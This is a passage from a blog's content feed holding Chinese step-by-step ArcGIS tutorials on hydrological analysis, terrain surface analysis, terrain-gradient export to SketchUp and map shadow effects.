注意点：</p><ul><li>栅格的处理注意路径一般只能用英文，否则可能出现“error99999无法复制栅格数据集”的错误；</li></ul><ul><li>波段数的输入和像素类型的选择要注意栅格图层的原有属性；</li></ul><h2 id="2-洼地填充filldem"><a href="#2-洼地填充filldem" class="headerlink" title="2.洼地填充filldem"></a>2.洼地填充filldem</h2><ol><li><p>打开【自定义】|【拓展模块】|选中【Special Analyst分析】；</p></li><li><p>选择【Special Analyst工具】|【水文分析】|【填洼】；</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/822183d5c1eac2d1f998554f3f99086d.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\9362b9df94e1184bb1691ff5c9fa026.png"></p><h2 id="3-汇流累积量"><a href="#3-汇流累积量" class="headerlink" title="3.汇流累积量"></a>3.汇流累积量</h2><h3 id="流向fdirfill"><a href="#流向fdirfill" class="headerlink" title="流向fdirfill"></a>流向fdirfill</h3><p>选择【Special Analyst工具】|【水文分析】|【流向】；</p><p>【输入】：无洼地DEM</p><p>【输出】无洼地水流流向数据fdirfill</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/3cc664c03b6aaadaf46b5f6d641ab19f.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\927c42e4c0157810104ed2dc0513c8c.png"></p><h3 id="计算汇流累计量"><a href="#计算汇流累计量" class="headerlink" title="计算汇流累计量"></a>计算汇流累计量</h3><p>选择【Special Analyst工具】|【水文分析】|【流量】；</p><p>【输入】：无洼地DEM流向数据</p><p>【输出】：流量flowacc</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/31d1109fc55b9538413a47799cb555ab.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\3fbe0497e504219f6b1b33a88c9f813.png"></p><h3 id="水流长度计算"><a href="#水流长度计算" class="headerlink" title="水流长度计算"></a>水流长度计算</h3><p>【Special Analyst工具】|【水文分析】|【水流长度】</p><p>测量方法：</p><ol><li>顺流方向DOWNSTREAM— 计算沿流路径从每个像元到栅格边上的汇点或出水口的下坡距离；</li></ol><ol start="2"><li><p>溯流方向UPSTREAM— 计算沿流路径从每个像元到分水岭顶部的最长上坡距离</p><p>这里选择顺流方向进行研究。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/27349d10cb8f051d056ba706f919673b.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\307376efabfd6631189c25b028bf392.png"></p><h2 id="河网提取"><a href="#河网提取" class="headerlink" title="河网提取"></a>河网提取</h2><h3 id="河网生成"><a href="#河网生成" class="headerlink" title="河网生成"></a>河网生成</h3><p>【Special Analyst工具】|【地图代数】|【栅格计算器】</p><h4 id="（1）根据流量提取河网（根据不同的沟谷设置不同的阈值）"><a href="#（1）根据流量提取河网（根据不同的沟谷设置不同的阈值）" class="headerlink" title="（1）根据流量提取河网（根据不同的沟谷设置不同的阈值）"></a>（1）根据流量提取河网（根据不同的沟谷设置不同的阈值）</h4><p>​    这里阈值取2000</p><p>​    输入“flowacc&gt;2000”</p><p>​    输出为streamnet2000</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/21d5a123ba172339c9f66411eaf4acf4.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\9f21801fb72a150aef38459c41f2390.png"></p><h4 id="（2）重分类河网栅格数据（关键）"><a href="#（2）重分类河网栅格数据（关键）" class="headerlink" title="（2）重分类河网栅格数据（关键）"></a>（2）重分类河网栅格数据（关键）</h4><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/89fe055be264420bb5c0141951ba52dc.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\c9e748d65abf2968f79f6ef8e960e52.png"></p><h4 id="（3）数量化栅格河网"><a href="#（3）数量化栅格河网" class="headerlink" title="（3）数量化栅格河网"></a>（3）数量化栅格河网</h4><p>【Special Analyst工具】|【水文分析】|【栅格河网矢量化】</p><p>【输入】：重分类后的河网栅格数据、河流流向数据</p><p>【输出】：河网矢量数据</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/d96e82ebe7964429c6e6447556e25b16.png" alt></p><h3 id="Stream-link生成（河网的连接点、包括弧段的起点和终点）"><a href="#Stream-link生成（河网的连接点、包括弧段的起点和终点）" class="headerlink" title="Stream link生成（河网的连接点、包括弧段的起点和终点）"></a>Stream link生成（河网的连接点、包括弧段的起点和终点）</h3><h4 id="（1）根据河网栅格数据提取连接点"><a href="#（1）根据河网栅格数据提取连接点" class="headerlink" title="（1）根据河网栅格数据提取连接点"></a>（1）根据河网栅格数据提取连接点</h4><p>【Special Analyst工具】|【水文分析】|【河流连接】</p><p>【输入】：重分类后的河流栅格数据、河流流向数据</p><p>【输出】：河流连接栅格数据（弧段和结点）</p><h4 id="（2）矢量化streamlink数据"><a href="#（2）矢量化streamlink数据" class="headerlink" title="（2）矢量化streamlink数据"></a>（2）矢量化streamlink数据</h4><p>【Special Analyst工具】|【水文分析】|【栅格河网矢量化】</p><p>【输入】：streanmlink栅格数据、河流流向数据</p><p>【输出】：streamlink矢量数据</p><h3 id="河网分级生成"><a href="#河网分级生成" class="headerlink" title="河网分级生成"></a>河网分级生成</h3><p>分级方法</p><ol><li>STRAHLER：仅当级别相同的河流交汇时，河网分级才会升高。因此，一级连接线与二级连接线相交会保留二级连接线，而不会创建三级连接线。这是默认设置；</li></ol><ol start="2"><li>SHREVE：所有没有支流的连接线的量级（分级）将被指定为一。量级是指可相加的河流下坡坡度。当两个连接线相交时，将它们的量级相加，然后将其指定为下坡连接线。</li></ol><h4 id="（1）将河网栅格数据进行河网分级"><a href="#（1）将河网栅格数据进行河网分级" class="headerlink" title="（1）将河网栅格数据进行河网分级"></a>（1）将河网栅格数据进行河网分级</h4><p>【Special Analyst工具】|【水文分析】|【河网分级】</p><p>【输入】：河网栅格数据（重分类前后均可）、河流流向数据、</p><p>【输出】：河网分级数据</p><p>这里采用STRAHLER方法</p><h4 id="（2）矢量化且符号化分级河网结果"><a href="#（2）矢量化且符号化分级河网结果" class="headerlink" title="（2）矢量化且符号化分级河网结果"></a>（2）矢量化且符号化分级河网结果</h4><p>【Special Analyst工具】|【水文分析】|【栅格河网矢量化】</p><p>将字段grid_code作为分类依据</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/1a990e46824f38ca42e6783415d96c35.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\29d53d607feaa17a6d5932c1d599c08.png"></p><h2 id="5-流域的分割"><a href="#5-流域的分割" class="headerlink" title="5.流域的分割"></a>5.流域的分割</h2><h3 id="流域盆地的确定"><a href="#流域盆地的确定" class="headerlink" title="流域盆地的确定"></a>流域盆地的确定</h3><p>（1）【Special Analyst工具】|【水文分析】|【流域分析】；</p><p>【输入】：河流流向数据；</p><p>【输出】：流域数据</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/ed359d2a4167608b5db0c4e0a91676c5.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\421e9893af58bb7583b4df6f92c3563.png"></p><h3 id="汇水区出水口的确定"><a href="#汇水区出水口的确定" class="headerlink" title="汇水区出水口的确定"></a>汇水区出水口的确定</h3><p>（可以使用streamlink代替）</p><p>【Special Analyst工具】|【水文分析】|【捕捉倾斜点】</p><p>【输入】：将要捕捉的输入倾斜点位置（这里输入streamlink数据）；</p><p>【入蓄积栅格数据】：流量数据；</p><p>【输出】：汇水区出水口数据</p><h3 id="集水流域的生成"><a href="#集水流域的生成" class="headerlink" title="集水流域的生成"></a>集水流域的生成</h3><p>【Special Analyst工具】|【水文分析】|【分水岭】</p><p>【输入】：流向栅格数据</p><p>【输入栅格数据或要素倾斜点数据】：要素倾泻点数据或者streamlink数据</p><p>【输出】：集水流域；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/b205229867552be9838cf6fc7aa8ec58.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\1913243efd70a587cca520ea57bbd8a.png"></p><h1 id="表面分析"><a href="#表面分析" class="headerlink" title="表面分析"></a>表面分析</h1><h2 id="坡度Slope"><a href="#坡度Slope" class="headerlink" title="坡度Slope"></a>坡度Slope</h2><ol><li><strong>坡度生成</strong></li></ol><p>选择【Special Analyst工具】|【表面分析】|【坡度】；</p><p>其中Z因子设为0.00003（Z因子设置越小，结果越精细，默认为1）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/bc410c04eb0b310c3d34bc6ffcb69204.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市坡度.jpg"></p><ol start="2"><li><p><strong>重分类reclassslope</strong></p><p>目的：由于山地坡度分类存在等级差别，固将其值进行重分类</p><ol><li>选择【Special Analyst工具】|【重分类】|【重分类】；</li><li>将其按如下分类为6类，分为5,15,25,35,45,83；</li></ol><table><thead><tr><th>山地坡度分类</th><th></th></tr></thead><tbody><tr><td>&lt;5°平坦坡</td><td>5°~15°缓坡</td></tr><tr><td>16°~25°斜坡</td><td>26°~35°陡坡</td></tr><tr><td>36°~45°急坡</td><td>&gt;45°险坡</td></tr></tbody></table><ol start="3"><li>打开重分类的栅格图层的属性表，添加【area】字段，并利用【字段计算器】输入“count*30*30”计算各级坡度所占的面积（其中count表示栅格个数，30*30是每个栅格的面积，可在原先DEM图层属性中找到）</li></ol></li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/85d43c8cae0393c6d912fdfa20027d16.png" alt="C:\\Users\\cjy\\Desktop\\专题图\\9f2862488d6605a7272c3cf49eb3975.png"></p><h2 id="2-地表粗糙度"><a href="#2-地表粗糙度" class="headerlink" title="2.地表粗糙度"></a>2.地表粗糙度</h2><p>打开【Spatial Analysis工具】|【代数计算】|【栅格计算器】</p><p>输入公式：1 / Cos（[Slope of DEM]*3.14159/180）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/bc7acaff5e72c6fb27afc66edca39a29.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市地表粗糙度专题图.jpg"></p><h2 id="3-剖面曲率Slope-slope"><a href="#3-剖面曲率Slope-slope" class="headerlink" title="3.剖面曲率Slope_slope"></a>3.剖面曲率Slope_slope</h2><p>选择【3D Analyst工具】|【栅格表面】|【坡度】</p><p>【输入】：上一步的坡度的结果；</p><p>【输出】：slope_slope</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/ea2ca508e7e771530c84adaf480f423d.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市剖面曲率.jpg"></p><h2 id="4-坡向Aspect"><a href="#4-坡向Aspect" class="headerlink" title="4.坡向Aspect"></a>4.坡向Aspect</h2><p>选择【Special Analyst工具】|【表面分析】|【坡向】；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/78b04283ccd828ef00f38fdd59698c20.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市坡向专题图.jpg"></p><p>其中Z因子设为0.00003（Z因子设置越小，结果越精细，默认为1）</p><h2 id="5-平面曲率Slope-aspect"><a href="#5-平面曲率Slope-aspect" class="headerlink" title="5.平面曲率Slope_aspect"></a>5.平面曲率Slope_aspect</h2><p>选择【3D Analyst工具】|【栅格表面】|【坡度】</p><p>【输入】：上一步得到的坡向数据；</p><p>【输出】：Slope_aspect</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/87a834545a20dc3825344ee5fd6e12cf.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市平面曲率.jpg"></p><h2 id="6-提取等高线"><a href="#6-提取等高线" class="headerlink" title="6.提取等高线"></a>6.提取等高线</h2><p>选择【3D Analyst工具】|【栅格表面】|【等值线】</p><p>【输入】：mz_dem</p><p>【等值线间距】：300</p><p>【Z因子】：1</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/665519ac0fd5a9cbae4e6160e05661f7.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市等高线.jpg"></p><h2 id="7-提取地形表面的阴影图"><a href="#7-提取地形表面的阴影图" class="headerlink" title="7.提取地形表面的阴影图"></a>7.提取地形表面的阴影图</h2><p>选择【3D Analyst工具】|【栅格表面】|【山体阴影】</p><p>生成地表阴影栅格Hillsha</p><p>进行DEM渲染</p><p>关闭除了mz_dem和hillsha以外所有图层的显示，将hillsha置于mz_dem之上</p><p>并对mz_dem图层属性进行符号化，拉伸如下：</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/b2da0bb4f6fb0ff7f06b6e6f0082e69b.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\5fb586860e970032fd80956d0abac6c.png"></p><p>在工具栏空白处右键，打开【效果】工具栏，设置栅格图层mz_dem的透明度为45%左右，结果如图：</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/dc7cdc71157645a0093ead394a0712e9.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市地形表面阴影.jpg"></p><h2 id="8-剖面图"><a href="#8-剖面图" class="headerlink" title="8.剖面图"></a>8.剖面图</h2><p>在工具栏空白处右键，打开【3D<br>Analyst】工具栏，点击【线插值】工具，跟踪一条线段，点击【剖面图】按钮，可得到要求的剖面图；</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/a5a2ba3ac65325d8f083252a33819e77.png" alt="C:\\Users\\cjy\\AppData\\Local\\Temp\\WeChat Files\\8ac295a45a6d09f4bd0828e27859dc1.png"></p><h2 id="9-起伏度"><a href="#9-起伏度" class="headerlink" title="9.起伏度"></a>9.起伏度</h2><p>选择【Special Analyst工具】|【领域分析】|【焦点统计】</p><ol><li><p>A</p><p>设置统计类型为最大值maximum；</p><p>领域类型为矩形；</p><p>领域大小为7x7；</p><p>得到一个领域为7x7的矩形最大值层面；</p></li><li><p>B</p><p>设置统计类型为最小值minimum；</p><p>领域类型为矩形；</p><p>领域大小为7x7；</p><p>得到一个领域为7x7的矩形最小值层面；</p></li><li><p>在【Special Analyst工具】|【栅格计算器】中输入A-B，</p></li></ol><p>得到一个新层面，其每个栅格的值是以这个栅格为中心的确定领域的地形起伏值。</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E6%B0%B4%E6%96%87%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%A8%E9%9D%A2%E5%88%86%E6%9E%90/0d654d3a4a0bfbb5bf804c0b7f0b1730.jpg" alt="C:\\Users\\cjy\\Desktop\\专题图\\梅州市地势起伏度.jpg"></p><p>注意点：</p><p>①坐标系统为CGCS-2000</p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS地形梯度效果生成</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h1 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h1><p>关键词：重分类；栅格转面；Shp-sketchup插件；</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><p>打开ArcScene，在目录树下在所在DEM数据集下右键单击属性，查看坐标系</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/0f356b9136499b61484f06601903f0c8.png" alt="0f356b9136499b61484f06601903f0c8"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/3985ef0bafb14d0a057e057157965a96.png" alt="3985ef0bafb14d0a057e057157965a96"></p><p>由图可知，该数据坐标系为经纬度的地理坐标系，而高程处理一般要转换为投影坐标</p><p>这里我们进行重新设置坐标系</p><p>利用<em>【数据管理工具】|【投影与变换】|【投影栅格】</em></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/06cea2a3c2208ec524ac5b2910ee2688.png" alt="06cea2a3c2208ec524ac5b2910ee2688"></p><p>打开图层属性，可看到已经转换成功</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/b043bc5aee934f344c3da8da90fe4ea7.png" alt="b043bc5aee934f344c3da8da90fe4ea7"></p><h2 id="符号化"><a href="#符号化" class="headerlink" title="符号化"></a>符号化</h2><p>打开图层属性，选择【符号系统】下的【已分类】，打开【分类】对话框，方法设置为【定义的间隔】，【间隔大小】这里设置为200（间隔大小视源数据的高程大小而定，如果不想要太密集，就把值调大，如果本身数据的高程很小，可以把值调小）</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/47f426f8f2eeb40091f6e64fd9572443.png" alt="47f426f8f2eeb40091f6e64fd9572443"></p><p>选择好看的颜色进行渲染</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/7523d1075a9ccc90d23c5a849f0cc6ca.png" alt="7523d1075a9ccc90d23c5a849f0cc6ca"></p><h2 id="重分类"><a href="#重分类" class="headerlink" title="重分类"></a>重分类</h2><p>利用<em>【Spacial Analyst】|【重分类】|【重分类】</em>对数据选择value字段进行重分类</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/0361978fda20ec97b4b7e6031d70bd80.png" alt="0361978fda20ec97b4b7e6031d70bd80"></p><h2 id="栅格转面"><a href="#栅格转面" class="headerlink" title="栅格转面"></a>栅格转面</h2><p>利用<em>【转换工具】|【由栅格转出】|【栅格转面】</em>将分类好的栅格转为面要素</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/d7535fc1f1ef9fc71a7e200260fe7434.png" alt="d7535fc1f1ef9fc71a7e200260fe7434"></p><h2 id="高程计算"><a href="#高程计算" class="headerlink" title="高程计算"></a>高程计算</h2><p>打开面要素的属性表，利用【添加字段】为该图层添加一个名为Height的实际高程字段，利用【字段计算器】输入‘gridcode<br>* 200（上文的间隔大小）’</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/271b5e4e542e3280d7ef6523b4ce2946.png" alt="271b5e4e542e3280d7ef6523b4ce2946"></p><h2 id="拉伸"><a href="#拉伸" class="headerlink" title="拉伸"></a>拉伸</h2><p>打开图层属性中的【拉伸】| 勾选【拉伸图层中的要素·····】</p><p>打开【表达式】，点击Height</p><p>将拉伸方式选为【将其添加到各要素的基本高度】</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/5c5f480be9ed4dd0dd7c32b2fc08a14d.png" alt="5c5f480be9ed4dd0dd7c32b2fc08a14d"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/75be29199ff5d9e2b25fe31eba8e7f7a.png" alt="75be29199ff5d9e2b25fe31eba8e7f7a"></p><h2 id="导出SketchUp格式"><a href="#导出SketchUp格式" class="headerlink" title="导出SketchUp格式"></a>导出SketchUp格式</h2><p>下载SketchUp插件</p><p>在Arcscene菜单栏上选择【自定义模式】|【从文件添加】| 添加SketchUp插件</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/3bfaee6d0f8f73efab6cc03810596888.png" alt="3bfaee6d0f8f73efab6cc03810596888"></p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/c71f13fc8dfe28a2d5ade6d49a5df2c0.png" alt="c71f13fc8dfe28a2d5ade6d49a5df2c0"></p><p>在【自定义模式】中勾选SketchUp插件，可看到图4.14的工具栏</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/ffb256902cb8bf2be21da279caf43983.png" alt="ffb256902cb8bf2be21da279caf43983"></p><p>在工具栏上；利用【选择】工具将整个模型选中，然后双击SketchUp工具。打开Options对话框，选择输出路径及参数</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/52921a6efc30eb59e1694890033bfaac.png" alt="52921a6efc30eb59e1694890033bfaac"></p><h2 id="在SketchUp中操作"><a href="#在SketchUp中操作" class="headerlink" title="在SketchUp中操作"></a>在SketchUp中操作</h2><p>打开SketchUp，点击【打开文件】将skp格式的地形梯度打开，可利用SketchUp的编辑工具进行修正分析等</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%9C%B0%E5%BD%A2%E6%A2%AF%E5%BA%A6%E6%95%88%E6%9E%9C%E7%94%9F%E6%88%90/91f976c97255b236bd36e1b4016a3599.png" alt="91f976c97255b236bd36e1b4016a3599"></p>]]></content>
      
      
      <categories>
          
          <category> ArcGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> ArcGIS </tag>
            
            <tag> 空间分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArcGIS制作阴影效果总结</title>
      <link href="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/"/>
      <url>/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>注意：</p><p>在制作阴影前，一定要注意先把要做阴影的要素类导入到地理数据库中，才能够进行制图表达</p><h1 id="纯色阴影"><a href="#纯色阴影" class="headerlink" title="纯色阴影"></a>纯色阴影</h1><ol><li><p><strong>将要素类的符号转为制图表达</strong></p><ol><li>在内容列表中，右键要素类图层，单击【将符号系统转换为制图表达】</li></ol><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/2f5d0045d457c6f62a7cbafa76b91103-1595217620622.png" alt="2f5d0045d457c6f62a7cbafa76b91103"></p></li><li><p><strong>使用移动几何的方式</strong></p><ol><li><p>右键点击转为制图表达的图层打开属性框，在符号选项卡上，在【单色模式】将颜色改为灰度70%</p></li><li><p>点击右上角的+号按钮添加几何效果并选择【移动】，点击【确定】</p></li><li><p>将X、Y的偏移值分别改为3pt，-3pt</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/1ecba16b3c78898a26a72c338e040a3f.png" alt="1ecba16b3c78898a26a72c338e040a3f"></p></li></ol></li><li><p>在内容列表中，将原要素图层转为制图表达后的图层叠加显示（注意制图表达图层在下边），便出现了阴影的效果</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/a0dcc7e00c65e03888dd7843746acb68.png" alt="a0dcc7e00c65e03888dd7843746acb68"></p></li></ol><h1 id="渐变阴影"><a href="#渐变阴影" class="headerlink" title="渐变阴影"></a>渐变阴影</h1><ol><li><p><strong>将制图表达的符号改为渐变模式</strong></p></li><li><p>在内容列表中，右键点击带有制图表达的图层并点击属性，在符号选项卡中，在【单色模式】右上角点击黑色小箭头并选择【渐变】模式；<img src= "/img/loading.gif" data-src="/2020/07/20/ArcGIS/ArcGIS%E5%88%B6%E4%BD%9C%E9%98%B4%E5%BD%B1%E6%95%88%E6%9E%9C%E6%80%BB%E7%BB%93/d70408ed43aab285523768c0063749c9.png" alt="d70408ed43aab285523768c0063749c9"></p></li><li><p>将【颜色1】改为灰度10%，将【颜色2】改为黑色，使用HSV算法，样式选择【缓冲区】，修改间隔为100，百分比为5，角度为0；</p><p><img src= "/img/loading.gif" 